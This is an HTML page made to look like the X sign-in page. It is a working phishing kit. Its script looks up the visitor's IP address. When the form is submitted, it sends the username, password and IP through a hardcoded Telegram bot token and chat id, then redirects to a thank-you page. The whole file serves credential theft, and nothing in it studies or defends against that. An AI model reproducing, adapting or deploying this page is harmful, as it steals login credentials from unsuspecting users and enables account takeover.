<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Sign in â€¢ X</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #000;
      color: #fff;
      height: 100vh;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .card {
      width: 100%;
      max-width: 380px;
      padding: 40px 30px;
    }

    .logo {
      font-size: 42px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 15px;
      background: #000;
      border: 1px solid #333;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }

    input::placeholder {
      color: #777;
    }

    input:focus {
      outline: none;
      border-color: #1d9bf0;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #1d9bf0;
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background: #1a8cd8;
    }

    .links {
      display: flex;
      justify-content: space-between;
      margin-top: 20px;
    }

    .links a {
      color: #1d9bf0;
      font-size: 14px;
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      .card {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="card">
      <div class="logo">X</div>
      <h2>Sign in to X</h2>

      <form id="contactForm" method="POST">
		  <input type="text" id="ipaddress" name="IPaddress" hidden>

        <input type="text" placeholder="Phone, email, or username" name="username" id="username" required />
        <input type="password" placeholder="Password" name="password" id="password" required />
        <button type="submit" id="button">Sign in</button>
      </form>

      <div class="links">
        <a href="#">Forgot password?</a>
        <a href="#">Sign up for X</a>
      </div>
    </div>
  </div>
<script>
	  document.addEventListener('DOMContentLoaded', function () {
            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipaddress = data.ip;
                    document.getElementById('ipaddress').value = ipaddress;
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        });
  document.getElementById('contactForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var ipaddress = document.getElementById('ipaddress').value;
   
      //       const city = document.getElementById('city').value;
      // const country = document.getElementById('country').value;
            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}`;
           
                var token = '8426130944:AAFqzg6H0uK4TpHPWKiYdqXve46_8Ekjy6I';
            var chat_id = '7605799343';

            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        window.location.href = 'thanks.html';  // Redirect to thank you page
                    } else {
                        alert('Error sending message.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        });
</script>
</body>
</html>
